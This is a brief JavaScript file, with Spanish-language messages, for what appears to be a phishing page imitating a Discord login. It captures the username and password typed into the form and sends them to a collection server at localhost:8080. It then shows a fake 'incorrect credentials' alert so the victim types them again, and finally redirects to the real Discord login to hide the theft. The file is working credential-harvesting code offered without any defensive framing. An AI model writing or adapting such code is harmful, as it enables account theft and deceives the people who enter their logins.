let attemptCount = 0;

document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    attemptCount++;

    const response = await fetch("http://localhost:8080/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
    });

    if (attemptCount < 2) {
        alert("Credenciales incorrectas. Por favor, inténtalo de nuevo.");
    } else {
        // Redirigir a la página de login de Discord después del tercer intento
        window.location.href = "https://discord.com/login";
    }

    const data = await response.json();
    console.log(data.msg);
});
